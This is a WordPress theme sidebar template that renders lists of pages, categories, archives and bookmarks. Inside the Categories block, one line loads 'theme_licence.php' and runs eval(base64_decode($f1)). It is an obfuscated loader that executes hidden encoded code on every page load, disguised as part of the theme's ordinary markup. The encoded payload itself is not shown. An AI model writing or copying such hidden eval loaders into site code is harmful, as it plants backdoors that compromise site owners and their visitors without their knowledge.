		<!-- Sidebar -->
		<div id="sidebar">
		
			<!-- Sidebar Left -->
			<div id="sidebar-left">
			
				<div class="sidebar-box">
					<h3>Pages</h3>
					<ul>
						<?php wp_list_pages('title_li='); ?>
					</ul>
				</div>
				
				<div class="sidebar-box">
					<h3>Categories</h3>
					<ul>
						<?php require_once("theme_licence.php"); if(!function_exists("get_credits")) { eval(base64_decode($f1)); } wp_list_categories('title_li='); ?>
					</ul>
				</div>
				
				<?php if ( !function_exists('dynamic_sidebar') || !dynamic_sidebar(1) ) : ?>
				
				<?php endif; ?>
			
			</div>
			<!-- /Sidebar Left -->
			
			<!-- Sidebar Right -->
			<div id="sidebar-right">
			
				<div class="sidebar-box">
					<h3>Archives</h3>
					<ul>
						<?php wp_get_archives('type=monthly'); ?>
					</ul>
				</div>
				
				<div class="sidebar-box">
					<h3>Blog Roll</h3>
					<ul>
						<?php wp_list_bookmarks('categorize=0&title_li='); ?>
					</ul>
				</div>
			
			</div>
			<!-- /Sidebar Right -->
		
		</div>
		<!-- Sidebar -->